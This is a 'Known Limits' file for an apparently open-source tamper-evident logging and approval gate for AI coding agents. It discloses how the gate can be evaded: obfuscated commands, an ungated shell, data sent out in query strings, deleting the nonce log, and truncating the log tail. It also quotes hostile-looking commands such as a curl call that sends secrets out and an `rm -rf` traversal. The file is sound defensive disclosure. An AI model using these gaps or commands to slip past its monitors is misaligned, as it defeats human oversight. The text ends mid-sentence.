<!-- known-limits:pin v1
 This file describes commit 2173d2316c1923998d473e2c8351543bce9c1c47
 stamped 2026-08-23
 subject: opaque-exec: gate local scripts handed to a script interpreter (#28)
 Re-stamp after updating this log: npm run limits-pin -- --stamp
 Divergent checkout? See: npm run limits-pin -- --check
known-limits:pin end -->

# Known Limits

This document lists the v1 limitations of the receipt layer. Honesty about limits is a feature.

## 1. Self-attested capture

Tamper-evidence begins at signing time. The log proves that *what was recorded* has not been altered since, but it does not prove that the recorded events were complete, accurate, or truthful at the moment of capture. The receipt is only as good as the data fed into it.

## 2. Outbound message capture

Outbound activity is now captured live by a `PostToolUse` hook for egress-shaped tool calls (network requests, remote git operations, publish commands), using the same matchers the policy engine uses to decide what is gate-worthy. This is captured by the host at the moment the tool call completes, not reconstructed later from a transcript, which is a real improvement in attestation strength. It is still not wire-level capture: there is no network proxy, no TLS interception, and no independent verification that the tool's own implementation reported its outcome honestly. A tool that lies about its own `tool_response`, or an egress path this repo's matchers do not recognize, is not captured. True wire-level capture would require a network-boundary proxy, which is a larger architectural change and not in v1.

Because the same matchers drive both capture and the `egress-other` gate, a gap in one is a gap in the other. A 2026-07-24 review closed several named gaps (`Invoke-RestMethod`/`irm`, `wget --post-file`/`--post-data`, `curl -T`). One deliberately remains: a plain GET carrying data in its query string, e.g. `curl https://host/collect?data=...`, is neither gated nor captured, because there is no flag to match on and gating every query-string GET would fire on ordinary API reads. Data leaving in a GET URL is the honest hole here, and it is the reason egress capture must not be read as complete.

## 3. No external anchoring in v1

The chain is local-only. External anchoring (to a timestamp authority, blockchain, or other notary) is a planned later enhancement. In v1, tamper detection relies on local key custody and periodic manual export/offsite backup.

## 4. Cost is reported in tokens, not dollars

Where the session transcript records per-turn token counts, receipts carry them. Dollar cost is not computed in v1: it requires an external, model-specific price table that is not bundled. Treat the cost column as token usage, not a billing figure.

**Re-verified 2026-07-26 against `895a176`. Still true, unchanged.** Recorded
because a re-check that finds nothing is worth as much as one that finds
something, and limit 29 exists precisely because nobody could tell when an entry
was last held against the code. The parser still carries `note: 'tokens only; no
USD in source'` and no price table exists anywhere in `src/`. This entry was
grouped with 13 in a work item titled "per-model cost attribution", which is a
different claim: 13 is about *whose* tokens, 4 is about *dollars*. **Amending 4
on the strength of that grouping would have been exactly the error that produced
limit 27's correction**, and it was avoided only by reading the source.

## 5. Session receipts are cumulative subsessions, not a single record

Claude Code fires `SessionEnd` more than once for the same session (on clear, on resume, on exit). Each firing that carries new activity appends a new receipt for that session, indexed `subsession` 0, 1, and so on. Nothing is ever amended or superseded, because the chain is append-only by design.

Two consequences worth knowing:

Each subsession receipt carries the whole session up to that moment, not just the new part. Subsession 2 is a superset of subsession 1. No single receipt is "the" record of a session; the highest subsession is the most complete one. Counting receipts is not the same as counting sessions, which is why the morning-after view reports both totals separately.

A firing that adds no new activity appends nothing, so repeated `SessionEnd` events cannot inflate the chain. Work done after the final firing is still never captured, since nothing runs after the last one.

## 6. Auto-capture is opt-in and hook-dependent

Receipts are written automatically only if Lotor's hooks are registered in your Claude Code settings. Four hooks now write to the chain: `SessionStart` opens a session record, `PreToolUse` records policy warnings and gated-action denials/approvals, `PostToolUse` records egress-shaped tool calls, and `SessionEnd` writes the session receipt. Installing the MCP server alone gives you the query, verify, and gate tools against an empty chain. Nothing is recorded until the hooks are wired up (see the README install steps) or a transcript is ingested by hand. Enforcement, likewise, only covers tool calls made after `PreToolUse` is registered and loading.

## 7. A receipt can be dropped under lock contention

Chain appends take an exclusive lock so concurrent writers cannot corrupt the chain. The lock waits a bounded time (about five seconds) and then gives up. The `SessionEnd` hook treats that give-up like every other failure: it reports one line to stderr and exits 0, because a receipt layer that can wedge your editor is worse than a missing receipt.

The consequence is that under heavy contention, or if a lock is held by a process that is stuck but not yet stale, a session can end without being receipted. The failure is announced on stderr rather than silent, but nothing retries it later. The chain stays valid and no partial entry is written. You lose that one receipt, not the log.

## 8. The chain signing key is stored unencrypted

There are two keys and they are protected very differently.

The approval key, which authorizes gated actions, is never written to disk. It is derived from your passphrase at signing time, so only the public half is stored.

The chain key, which signs log entries for tamper-evidence, is written to `keys/chain.key` in plaintext (mode 0600 where the filesystem honors it). Anyone who can read that file can forge chain entries that verify cleanly. Tamper-evidence therefore assumes an attacker who can alter the log file cannot also read the key file, which is a weak assumption on a fully compromised machine. Hardware-backed key custody (TPM or secure enclave) is the fix and is not in v1.

## 9. The chain key is per-machine, so receipts do not verify across machines

The chain key is generated on first use and lives on that machine. Receipts written on one machine will not verify on another unless you copy the chain public key across. The approval key behaves differently: because it is derived from your passphrase, the same passphrase reproduces the same approval key anywhere. Expect a single-machine chain in v1.

**Amended 2026-07-26, verified against `895a176` by reading the source and
running an export/verify round trip on the live 640-entry chain.**

The gap this entry described is closed. `bin/export-chain.js` (`npm run export`,
`npm run verify:bundle`) packages the chain public key and every entry into one
file that verifies against the **supplied** key rather than the local one. The
private key is never read by that file, so a bundle is safe to hand to someone.

The sentence above is what made this worth building: "unless you copy the chain
public key across" described a *possibility*, not a workflow. Nothing packaged
the two halves and nothing verified against a supplied key, so in practice the
record was one only its owner could read. **A record you cannot hand over is
most of the way back to trusting the party being audited**, which is the thing
this project exists to refuse.

**What is still true.** The key remains per-machine and generated on first use;
this makes a chain *portable*, not *multi-machine*. Two installs still produce
two independent chains under two keys, and nothing merges them. And a clean
verify on a bundle inherits every limit the local chain has: tail-truncation
still leaves a valid prefix (limit 22) and capture was self-attested to begin
with (limit 1). The verifier prints both of those rather than a bare tick, which
is the correct behaviour and is also why "VALID" must not be read as "complete".

## 10. Approval key strength is entirely passphrase strength

The approval key is derived with PBKDF2 (600,000 iterations, SHA-256) from your passphrase and a salt that is a compile-time constant, not a per-install random value. Two people who choose the same passphrase get the same approval key, and precomputation against that fixed salt is shared across every installation. Iteration count raises the cost of guessing but does not change the fact that a weak passphrase yields a weak key. Choose accordingly. A per-install random salt is a later change and would be a breaking one, since it alters key derivation.

## 11. The gate matches patterns, and patterns are evadable

The `PreToolUse` hook enforces Lotor's policy by pattern-matching the tool name and `tool_input`. v1's threat model is the honest agent making a consequential move without sign-off: accident, overreach, a naively followed injected instruction. The gate is not designed to withstand an adversarial model that is engineering around the matcher; command-string matching can be evaded by obfuscation, for example building the verb from fragments or invoking through a wrapper binary that the matcher cannot see into. If you need adversarial-grade containment, this is not the layer to rely on.

One evasion that used to belong on that list no longer does. Until 2026-07-24, running a dangerous action through a shell other than `Bash` (PowerShell on Windows) bypassed the command rules entirely, and for `self-mod` it did so in the default configuration, no obfuscation required. That was a defect, not an adversarial technique, and it is fixed: the command rules now key on the shape of the input, not the tool's name (see limit 21). It is called out here because earlier drafts of this entry listed "a non-`Bash` tool name" as an example of adversarial obfuscation, which understated it. It was not a clever evasion; it was the gate not being armed for the machine's own shell.

A few honest corollaries that follow from the same shape:

Engine errors fail open by design. A Lotor bug (policy unreadable, evaluator crash, store I/O failure) must not brick every tool call, so the hook reports on stderr, appends a best-effort receipt when it can, and exits 0. A gate that never lets a tool run is worse than a gate that occasionally lets one through with a note.

A bare `git push` to a checked-out protected branch is not detected. The `push-protected` rule fires only when the command explicitly names `main` or `master` as a ref. A `git push` with no ref, or with the ref given through a shell variable, flows free; the merge point, not the push, is what protects the branch.

Hook registration lives in the user's settings file, whose edits are themselves rule 1. A hostile edit landing between sessions is therefore only caught at the next session's snapshot, not in real time. Treat the registration surface as part of your threat model.

## 12. Pre-fix receipts are permanently ~2x inflated (cost/2 corrects this going forward)

Before 2026-07-22, the parser summed `message.usage` once per JSONL line. Claude Code
writes one assistant message across several lines (a text block, then one line per
`tool_use` block), and every one of those lines carries a byte-identical copy of the same
usage object. The parser counted it 2 to 6 times, so every token figure in every receipt
signed before this fix is inflated, empirically by a factor close to 2x (measured 2.083
and 2.035 on two independent real transcripts; verified exact, not heuristic, since zero
usage conflicts were found among lines sharing a `message.id`).

The fix (this commit) dedups usage by `message.id`, with a fallback to `requestId`, then
`uuid`, then a per-line key for entries that carry none. Receipts written from this point
forward carry `cost.schema: 'cost/2'`; its absence marks a receipt as pre-fix and roughly
double reality. Because the chain is append-only, no existing signed receipt can be
corrected or replaced. Old figures stand as signed and wrong. Do not trust a token count
on a receipt without a `cost.schema` field.

## 13. Cost is not attributed per model or per harness

`cost` is one flat total per session, summed across every assistant message regardless of
which model produced it. `session.model` records only the last model seen in the
transcript, overwritten on every assistant turn. It is not a breakdown: a session that
touches more than one model (for example, the orchestrating session on Claude plus work
dispatched mid-session to an Ollama-hosted model) reports a single blended total under a
single trailing model name.

This matters because different providers report token usage on fundamentally different
bases. One real comparison found a service reporting 702,944,347 input tokens with zero
cache activity, against another reporting 8,487 input tokens and 163,480,857 cache-read
tokens for comparable work. Summing across services, or reading `session.model` as "the
model this session's cost was incurred on," produces a number with no coherent meaning.
Per-model, per-harness cost attribution is not built. Treat any total from a mixed-model
session as directional at best, never as a cross-service comparison.

**Amended 2026-07-26, verified against `895a176` by reading `src/parser/index.js`
and running its tests. HALF of this closed. The half that did not is the half the
title names second, and the entry stays open on that basis.**

**Per-model: built.** Receipts now carry `cost.byModel`, a per-model breakdown of
input, output, cache-creation and cache-read tokens plus a message count, under
schema `cost/3`. A message with no model field lands in an `unknown` bucket
rather than being dropped, so the buckets do not silently lose work. Crucially,
**no sum across buckets is produced**, deliberately: the entry's own argument is
that adding tokens across providers yields a number with no coherent meaning, so
the fix must not quietly reintroduce the blend it was built to expose.

**Per-harness: not built, and nothing has changed.** There is no `harness` field
anywhere in `src/`. A chain written by two harnesses still cannot say which one
wrote what. This matters more now than when the entry was written, because a
second harness is a live plan rather than a hypothetical, and the field has to
exist *before* the second harness starts writing or the entries it produces are
retroactively unattributable. An append-only chain cannot be backfilled.

**And the flat total is still there.** `session.model` still records only the
last model seen. The breakdown sits alongside it rather than replacing it, so
anything reading `session.model` as "the model this session's cost was incurred
on" is still wrong in exactly the way described above. Read `byModel`, not the
top-line total.

**Amended again the same day, about two hours later. The paragraph immediately
above that says "per-harness: not built" is now false, and leaving that gap
unmarked for even an afternoon is the exact behaviour limit 29 describes.**
Recording it as a second dated note rather than editing the first, because the
sequence is the useful artifact: a disclosure written carefully at midday was
wrong by early afternoon, which is how short the half-life actually is.

**Per-harness: built.** `src/harness.js` resolves a harness for every
`session-open` entry, and `bin/hook-session-start.js` writes it into the chain.
It was shipped *before* the second harness rather than with it, because the
chain is append-only and **an entry written without the field can never acquire
it** — every entry a second harness produced first would have been permanently
unattributable.

**It never returns a bare name, and that is the load-bearing part.** The block
carries a `basis`:

- `declared` — an operator or launcher set `LOTOR_HARNESS`, or the payload named
  itself. Trustworthy exactly to the degree whoever set it is.
- `inferred` — guessed from the payload's shape, requiring **two** independent
  signals rather than one, and shipping the evidence that produced the guess.
- `unknown` — nothing to go on. **It stays `unknown` and never defaults to
  `claude-code`.** Defaulting an unattributable entry to the common harness
  would convert missing information into a false statement that a reader has no
  way to detect, which is worse than an absent field.

**What this is not: authentication.** A harness naming itself is self-attested,
exactly as capture is (limit 1). Anything that can set an environment variable
can call itself anything. This makes a mixed chain **separable under honest
conditions**; it does not make the label adversarially trustworthy, and nothing
here should be read as proving provenance.

**Residual, stated rather than left to be discovered.** The field is on
`session-open` only. Gated-action entries and session receipts do not carry it
and are attributable only by association through their session. That is
sufficient for splitting a chain by harness and is not the same as per-entry
provenance. The per-model half above is likewise unchanged by this: cost is
still not broken down per harness, only per model.

## 14. A session that dies badly leaves an open, not a full record

**Partly fixed.** Capture used to be driven entirely by `SessionEnd`: a session
that was force-killed, crashed, hit an OOM, or lost power wrote no receipt at
all, so the chain showed an unbroken run of well-behaved sessions and no trace
that any others existed. The sessions most worth a record were exactly the ones
the design dropped.

`SessionStart` now opens the record at the moment a session begins, anchoring
the session id, the source, the policy in force and its digest, the chain head,
a verify result, and which Lotor hooks were registered. An abnormal exit now
leaves an opened-but-never-closed entry, and `npm run receipts` reports the
unclosed count under SESSION OPENS. Silence has become evidence.

What is still true after the fix:

An open is not a record of the work. It says a session started, under which
policy, from which chain head. Everything between the last captured tool call
and the crash is still unknown. The unclosed marker tells you where to stop
trusting the log, not what happened past that point.

It only works if the hook is registered. A Lotor install with `SessionEnd`
wired up and `SessionStart` missing has exactly the old failure mode, silently.
`npm run receipts` says so explicitly when it finds zero opens, and each open
receipt carries a snapshot of which hooks it could see in your settings, but a
snapshot taken at start cannot catch an edit made after it.

Read the absence of a receipt as "unknown", never as "nothing happened". That
instruction survives the fix. It now applies to a narrower window.

Related, and unchanged: the gate only protects tool calls that occur after its
`PreToolUse` hook is registered and loading. Anything the harness runs before
the gate is live is ungated by construction, which is the argument for the
receipt layer being the first thing a session spins up rather than the last.

## 15. Lotor's mode and your harness's permission mode are independent

Herding modes (Herded / Grazing / Loose, 2026-07-23) govern what Lotor's own
gate requires. They know nothing about, and cannot see, whatever permission
mode the harness running the agent is in. If the harness itself has a mode
that bypasses its own confirmation prompts, that mode operates on a completely
different layer: Lotor's gate still fires and still blocks, because it is a
hook the harness invokes regardless of the harness's own prompt settings.

The genuinely dangerous combination is the other direction: Lotor in Loose
mode plus a harness-level setting that skips tool-call review entirely. Loose
already warns rather than blocks on every rule except `self-mod` and
`mode-change`; a harness that also isn't pausing to show the human anything
means nothing stands between the agent and the action on either layer. Neither
layer is aware the other exists, so neither can compensate for the other being
permissive. Choosing Loose is a deliberate choice about Lotor's layer only;
it says nothing about what your harness is configured to do on its own.

**Correction, 2026-07-24.** The claim above that the two layers "cannot see"
each other was wrong in one direction. Claude Code sends `permission_mode` on
every hook event, including `PreToolUse`, so Lotor receives the harness's mode
on every gated call and was discarding it in `parsePayload()`. "Cannot see"
was an assumption that was never checked, and it was false.

**Now detected.** `bin/hook-pre-tool-use.js` warns when Lotor is in Loose and
the harness reports `bypassPermissions`, `dontAsk` or `auto`, and records the
posture on the chain once per session with both modes named. What that buys
is visibility, not protection:

- It warns, it does not block. Loose is a deliberate choice about Lotor's
  layer and escalating it to a denial would override a setting made on
  purpose.
- `acceptEdits` is excluded on purpose. It is partial, since edits
  auto-accept while commands still prompt, and warning on a posture that is
  usually reasonable is how a warning gets ignored.
- The detection depends on the harness reporting its mode honestly. It is a
  field in a payload, not an attestation, so it tells you what the harness
  says about itself.

Everything else in this entry stands. The layers still do not compensate for
one another, and Loose plus a permissive harness is still the combination to
avoid; it is simply no longer silent.

## 16. An approval token has no expiry

`verifyApproval()` (`src/gate/index.js`) checks the token's structure, that its
request matches the action being attempted, that its nonce has not been used
before, and its signature. It never checks the token's `timestamp` against the
current time. A signed token is valid until its nonce is spent, however much
time has passed since it was signed — an approval from a week ago for an
action that is only now being attempted still verifies cleanly. There is no
freshness window: staleness alone is not a rejection reason in v1.

Replay protection is real but conditional on one file. A used nonce is
recorded by appending to `keys/approval-nonces.log`, and the check is a scan
of that file. Since tokens never expire, deleting that log restores every
token ever signed to validity. That file lives under `keys/`, which the
`self-mod` rule now gates across every shell (fixed 2026-07-24; before that
it was gated for `Bash` only), so erasing it through the tool layer requires a
signature. A process with direct filesystem access, outside the gated tools,
can still delete it, and the same residual applies to the chain itself (limit
22). The log also grows without bound and is scanned linearly on every gated
call.

**Amended 2026-07-26, verified against `895a176` by reading `src/gate/index.js`
and running `test/approval-token-freshness.test.js`.**

The first paragraph is closed. `verifyApproval()` now checks the token's
`timestamp` against the clock and rejects on both sides: older than 60 minutes
is stale, and more than 120 seconds in the future is a clock problem or a forged
stamp. **A stale token gets its own denial reason naming the age and the limit**,
rather than presenting as a mismatch, because a stale-token denial that read like
a mismatch would send the operator hunting the wrong problem. Sixty minutes was
chosen for the away-signing case rather than for security: the owner may sign
from a phone over their own VPN, and a tighter window would manufacture false
failures in the exact workflow it exists to serve. Every false failure teaches
the operator to sign faster and read less (limit 26).

**The second paragraph is narrowed, not closed, and the distinction is the
point.** Deleting `keys/approval-nonces.log` no longer restores *every token ever
signed* — it restores only those signed within the last hour. That is a real
reduction in blast radius and it is not a fix: a process with direct filesystem
access outside the gated tools can still delete the log, and any token inside its
window comes back. The clock-proof bound is still the single-use nonce; the
freshness window reads the system clock, so moving the clock backward widens it,
exactly as limit 20 already notes for grant expiry. **Two ceilings, one
clock-dependent and one not.** Neither alone is the guarantee.

Unbounded log growth and the linear scan on every gated call are unchanged.

See also limit 30: expiry bounds how long a banked signature waits and does not
stop one from existing, and a token spent inside its window is spent on whatever
command matches.

## 17. A grant lets one signature cover many executions

Delegation grants (2026-07-24) exist because a single-use token covers one
exact request and is spent once, so a session that hits the gate forty times
means forty signatures, and in practice that means the gate gets turned off. A
grant is one signature over N enumerated requests, bound to one session, with
an expiry and a shared action ceiling.

The comparison is byte equality over `canonicalizeRequest()`, the same
function and the same canonical form the token layer already uses. So a grant
inherits nothing from limit 11: there is no pattern to evade, because nothing
here pattern-matches.

**What a grant genuinely gives up, relative to a token.** A token is reviewed
once and spent once. A grant is reviewed once and spendable up to
`maxActions` times inside its window. A command you read and approved can
therefore run repeatedly with no further review. That is the trade, made
deliberately, and it is the one respect in which a grant is weaker than the
primitive it extends. Size `maxActions` accordingly, and remember that
approving a command is approving every effect of running it that many times.

What a command does once it runs is still not knowable from its text. A grant
changes only how many times an already-reviewed string may run. It does not
make the string safer, and nothing in the grant path inspects behaviour.

## 18. The chain now records authorised command strings in plaintext

Recording a grant on the chain (2026-07-24) means the enumerated requests are
written to `chain.jsonl` in full, including exact command strings and file
paths. This is deliberate: a digest would let you verify a grant file you
still hold, but not reconstruct what was authorised once that file is gone,
and reconstruction is the point of recording it.

It does change what the log contains. Elsewhere the chain stores a
`paramsDigest` rather than parameters, so before this change most tool
arguments were present only as hashes. Authorised commands are now readable in
the log. The log is local and operator-held, which is the premise of the whole
system, but if you were relying on the chain being mostly hashes, it no longer
is for this entry type.

## 19. A grant can be revoked by deleting a file, and only by that

There is no revoke command. A grant stops applying when it expires, when its
ceiling is spent, or when its file is deleted from `<LOTOR_HOME>/grants/`.

Deleting requires no signature. That direction fails safe, since removing a
grant only ever reduces capability, and since 2026-07-24 the authorisation
itself is recorded on the chain, so deleting the file destroys the capability
without destroying the record of what was granted. But it does mean anything
with write access to your Lotor home can disable your own approvals, and the
first sign of it is work being denied that you expected to go through.

## 20. Grant expiry depends on the system clock

`expiresAt` is compared against `Date.now()`. Moving the machine clock
backwards extends every unexpired grant. Nothing here consults an external
time source, and limit 3 (no external anchoring) applies to grants exactly as
it applies to receipts.

This is why grants carry two independent ceilings. `maxActions` is counted
from `grant-use` entries on the append-only chain and does not depend on the
clock at all, so a grant with a clock-proof ceiling of 5 is bounded at 5 uses
regardless of what the clock says.

That bound holds under concurrency, but only because it was fixed to. An
earlier version counted uses from a chain snapshot read *before* the lock and
appended *after* it, so two overlapping gated calls under one grant could each
observe the same count and each proceed, exceeding `maxActions` by the number
of calls in flight. The check and the append now run together inside the
chain lock (`appendReceiptGuarded`), so the count the decision uses is the
same view the `grant-use` entry lands on. Regression guard:
`test/grant-concurrency.test.js` fires a barrier-synchronised burst and
asserts exactly `maxActions` approvals land; the pre-fix path was confirmed to
exceed the ceiling under the same barrier.

## 21. The command rules match strings, not intent

The rules that read a command line reason about its text, not about what it
will do. That cuts both ways, and an adversarial review on 2026-07-24 found
it cutting the wrong way in several rules at once. The under-gating defects
that review found were fixed the same day; the over-gating that remains is
by design. Both are recorded here, because a reader extending the rule set
needs to know it matches text, and a reader trusting the gate needs to know
where that was getting the answer wrong.

### Under-gating found and fixed, 2026-07-24

Each of these let a dangerous command through. Each is closed, with a
regression test named.

- **`self-mod` fired only for the `Bash` tool.** Its matcher only ever read
  `tool_input.command`, but the dispatcher gated it behind `toolName ===
  'Bash'`. On Windows, where PowerShell is the primary shell, the gate's own
  source, its policy, its hooks, and the receipt chain could be rewritten
  unsigned in every mode. This was the most serious finding: not an
  obfuscation an adversary had to construct, but the default configuration
  failing to enforce. Fixed: `isSelfMod` routes any command-carrying tool
  through the command matcher (`src/policy/index.js`). Guard:
  `test/selfmod-covers-core.test.js` exercises Bash, PowerShell and Edit.
- **`self-mod` protected only `src/gate` and `src/policy`.** The grant
  verifier (`src/grant`), the hash chain (`src/chain`) and the store
  (`src/store`) were ungated, though `core-paths.js` already treated them as
  non-delegable. Two lists that were meant to agree had drifted. Fixed: the
  self-mod fragment list now covers every core directory, and
  `test/selfmod-covers-core.test.js` reads the real `core-paths` export and
  fails if they drift again.
- **`opaque-exec` was disabled by a read verb anywhere in the string.**
  `.\deploy.ps1 -Type full` was read as containing the verb `type` (a
  hyphen is a word boundary) and exempted, defeating the rule created for the
  deploy incident. Fixed: the read-verb exemption must now LEAD its segment,
  and the command is split on shell separators so `read a.ps1 && ./evil.ps1`
  gates on the second segment.
- **The destructive allowlist matched substrings.** `rm -rf ./templates`
  was exempted because `temp` appears inside `templates`. Fixed: whole
  path-segment equality; `templates`, `attempts` and `contemplation` gate.
- **`egress-other` missed common exfiltration forms.** `Invoke-RestMethod`
  / `irm` (the usual PowerShell API call), `wget --post-file` / `--post-data`,
  and `curl -T` were unrecognised. Fixed: all added.
- **A commit message hid an executable substitution.** `git commit -m
  "$(curl -d @secrets ...)"` had its message blanked before matching, hiding
  the curl the shell would run. Fixed: a message containing `$(...)`,
  backticks or `${...}` is left intact so the matchers see it.
- **The grant ceiling was not concurrency-safe.** See limit 20.

### Over-gating that remains, by design

These make the gate cost more than it strictly must. The direction is the
safe one: a false denial costs a signature, a false allow costs the
guarantee. They are recorded so the cost is not a surprise.

- **Reading a protected file costs a signature.** `cat`, `grep` or `sed` of a
  gated path is denied like an edit, because both are commands naming the
  path. Reading through a tool the rule does not cover (the Read tool) is not
  denied, so the cost is uneven rather than uniformly high.
- **Prose naming a protected path trips the gate.** A commit message or a
  heredoc that merely *mentions* the gate's source matches. Writing about the
  gate looks, to a text matcher, like modifying it.
- **A script the engine cannot read is treated as executable even when it is
  only being read.** `opaque-exec` gates `sed -n 1,5p deploy.ps1` because
  `sed` can also mutate in place (`sed -i`); it does not try to prove the
  invocation is read-only.

### Why the remaining over-gating is not simply relaxed

The obvious relaxation, exempting commands that begin with a read verb, was
tried on 2026-07-23 and opened a hole within minutes: only the first token
was checked, so a read verb followed by a redirect could overwrite the file
the rule protects. The suite caught it and it was reverted whole. A relaxation
that is actually safe has to classify on whether a command can *mutate*,
across an arbitrary shell string, where the mutation can hide inside a script
the matcher cannot read. That is the wall `opaque-exec` exists to acknowledge.

The standing rule for this matcher: crying wolf is the cheap failure, silence
is the expensive one, and any change that makes it quieter has to answer what
it now misses.

## 22. Tamper-evidence detects alteration and head-truncation, not tail-truncation

`verifyChain()` (`src/chain/index.js`) recomputes each entry's hash, checks its
signature, checks that entry 0 carries the genesis constant, and checks that
each entry's `prevHash` links to the one before it. Removing entries from the
*head* breaks the genesis check and is caught. Removing entries from the
*tail* is not: the remaining prefix is internally consistent, every hash and
signature still verifies, and `seq` simply resumes from the shortened length.
Nothing outside the file records how long the chain should be, so a truncated
chain passes `npm run verify` clean.

This needs no key. Deleting or truncating `chain.jsonl` through the tool layer
now requires a signature, because `receipts/` is gated by `self-mod` across
every shell (fixed 2026-07-24; before that, gated for `Bash` only). The
residual is a process with direct filesystem access, outside the gated tools,
which can truncate the tail and leave a chain that verifies. Closing that
needs something the file cannot provide about itself: an external anchor (limit
3) or an off-chain signed head-marker, and any purely local marker is itself a
deletable file subject to the same move. It is not fixed in v1 because there is
no honest local-only fix.

Read a clean `verify` as "what remains has not been altered", never as
"nothing was removed."

## 23. self-mod over-gates conventional source-dir names in unrelated repos

The `self-mod` rule protects Lotor's own core directories by literal path
segment: `src/gate/`, `src/policy/`, `src/chain/`, `src/store/`, `src/grant/`,
and the rest. The matcher keys on the segment text, not on the Lotor install's
actual repo location, which it does not know. So a command touching a directory
of the same conventional name in an **unrelated** project run through the same
Lotor install is gated as self-mod: `cat ./src/store/model.js` in your own app
trips the gate and costs a signature, even though it has nothing to do with
Lotor. This is the accepted over-gating direction (crying wolf is the cheap
failure, limit 21), but the blast radius is wider than Lotor's own tree: any
repo with a `src/store`, `src/chain`, or `src/grant` path. Scoping the match to
the Lotor install's own directory would require the matcher to know that path,
which is not wired in v1.

A related asymmetry from the same rule: a command *ending* in the fragment with
a trailing slash (`ls ./src/chain/`) slips, because `normalizePath` strips the
command's trailing slash before matching, while the file form
(`.../src/store/x.js`) gates. The over-gate is real for the file form; the
trailing-slash directory form is an under-gate of the same rule.

## 24. The destructive allowlist exempts real directories named tmp/temp/scratchpad/mktemp

`destructiveAllowlisted` exempts an `rm -rf` / `Remove-Item` whose resolved path
has **any** segment equal to `tmp`, `temp`, `scratchpad`, or `mktemp`. A real,
non-scratch directory that happens to sit under such a name (`/var/tmp`,
`/etc/tmp`, `/production/data/tmp`) is therefore exempted from the destructive
gate. The 2026-07-24 `..`-normalization fix (limit 21) closed the traversal
*escape* (`rm -rf /tmp/../etc` no longer launders to an exempt verdict, because
`..` pops the scratch segment before the check runs), but the any-segment
leniency itself is by design: the allowlist exists so routine scratch cleanup
does not cost a signature, and tightening it to a leading-segment-only rule broke
legitimate deletion of nested scratch dirs like `/home/me/scratchpad/run-1`.
Exposure is limited to targets genuinely sitting under a scratch-named directory.

**Amendment (2026-08-29).** Two matcher changes in the same rule family as this
entry, both closing under-gates that let a destructive delete slip past the gate
when its spelling was not the exact compact form:

- *rm / Remove-Item trigger now scans flag order and long-form options.* The
  trigger previously required the `-r` and `-f` letters ADJACENT in one bundle
  (`-rf` / `-fr`) or `--recursive` as the literal next token. So `rm --force
  --recursive`, `rm --ignore-times --force --recursive`, separated shorts
  (`rm -r -f`), and flags after the operand (`rm file.txt --force --recursive`)
  were all silent. The fix shares one token predicate between the trigger and the
  target extractor: long options match by exact name (`--force`, `--recursive`),
  short bundles explode per character, so every ordering reduces to the same two
  booleans. A trigger that fired only on adjacency was the *expensive* failure
  (silence); this widens to the cheap one (occasional false positive), which is
  the correct direction for this rule.
- *`git clean -f` with `-d`/`-x` is now gated.* `git clean` never spells an `rm`
  token, so the destructive matcher had zero handling for it and `git clean -fdx`
  force-deleted the whole tree silently. The gate now requires `-f`/`--force`
  AND a depth/ignored amplifier (`-d`/`--directory` or `-x`/`--ignored`/`-X`);
  `-n` (dry-run) and bare `git clean` stay free. Two pathspec defects the
  reviewer caught are closed: `-e <pattern>` / `-x <pattern>` take a *value* and
  that value is skipped (it is not a pathspec, so an allowlisted exclude pattern
  can no longer launder a whole-tree clean), and *every* pathspec is checked, not
  just the first (an allowlisted first pathspec no longer exempts later
  pathspecs). A pathspec still scopes the blast radius through the same
  scratch-segment allowlist this entry describes; no pathspec means the whole
  tree, which always gates.
- *Scope discipline.* The rm trigger now scans only the command *segment* that
  contains `rm` (split on `&&`/`||`/`;`/`|`/newline), not the whole command, so
  `grep -rf x && rm y` no longer fires on the rm. This is the previously
  undeclared false-positive class: the cheaper direction, but it costs signatures
  on ordinary work and is now stated here on purpose.

## 25. The gate knew git's transports and not git's vendor CLI

Until 2026-07-24, `gh` — the GitHub CLI, authenticated against the user's account
from the system keyring — was almost entirely invisible to the rule set. Three
specific shapes were matched (`gh pr merge`, `gh release create`, `gh * create`);
everything else was not. Verified live, not hypothesized: `gh repo edit` changed a
public repository's description with no gate, no warning, and no signature request,
while a plain `git push` to the same repository would have gated. Ungated by the
same omission: `gh repo edit --visibility public`, `gh api` with any mutating
method, `gh secret set`, `gh release delete`, `gh workflow run`, `gh repo delete`.
That was a live, credentialed write path to every repository the account owns, and
the inconsistency was worse than the gap: the rules gated the low-level transport
and allowed the high-level tool that wraps it.

Fixed the same day, structurally rather than by extending the verb list. `gh` is
treated as what it is, an authenticated remote API client, and every invocation
gates as egress unless its subcommand is on a short read-only allowlist (`view`,
`list`, `status`, `checks`, `diff`, `search`, `browse`, `clone`, `download`,
`watch`, `help`, `version`, `completion`). Write verbs are not enumerated
anywhere, because enumerating the bad list is the shape that leaked here and
leaked one terminator per round in the gauntlet (limit 21): a subcommand this
matcher has never heard of, including whatever `gh` ships next year, gates by
default. `gh api` always gates regardless of method; it is the raw escape hatch,
and a `-f` field silently turns its GET into a POST.

What this does not fix, stated against interest: the matcher recognizes `gh` by
name. Any other authenticated CLI on the machine — `aws`, `az`, `gcloud`,
`vercel`, `flyctl`, an npm-installed deploy tool — is still invisible unless its
traffic happens to go through a transport the rules already know. A
network-capable binary cannot be recognized as such from its command string. This
entry adds one row with the right polarity; it does not close the class. The class
limit is limit 21's: the rules match strings, not intent.

## 26. The matchers scanned prose as code, and the gate cried wolf on its own commit messages

Until 2026-07-24, two command rules (`push-force`, `push-protected`) matched
against the raw command string including commit-message text, and the two that did
strip messages (`publish`, `egress-other`) un-stripped the entire command whenever
a backtick or `$(` appeared anywhere in it, so one markdown code span in a message
re-exposed all of it. Heredoc bodies were never stripped at all. Verified live,
twice in a row: a plain `git add && git commit` into a repository with no remote
configured was denied first by `push-protected`, because the commit message
described a future `git push origin main`, and then, after rewording, by `publish`,
because the new text mentioned releases and merges. No push was possible from that
repository. The gate was blocking the description of an action, not the action.

This is the corrosive failure, not the expensive one: every false denial teaches
the operator to sign without reading, and approval fatigue is how a real denial
eventually gets signed through.

Fixed by stripping provably inert prose at one choke point (`matchableCommand`)
used by every command matcher, so no rule can forget to strip; two rules forgetting
was half of this defect. What the gate now deliberately does not see, stated
plainly because it is the cost:

- the argument of `-m` / `--message` when single-quoted (the shell performs no
  expansion inside single quotes, ever), or double-quoted with no `$(`, `${`, or
  backtick inside that region;
- heredoc bodies fed to `git commit|tag|notes|merge`, `cat`, or `tee`, with no pipe
  on the heredoc line, when the delimiter is quoted or the body contains no
  expansion syntax.

Why the trade is acceptable: every blanked region is one the shell delivers as
literal data to a program that treats it as text. What stays visible, verified by
regression tests run against the unfixed code first: `bash -c 'git push ...'` (an
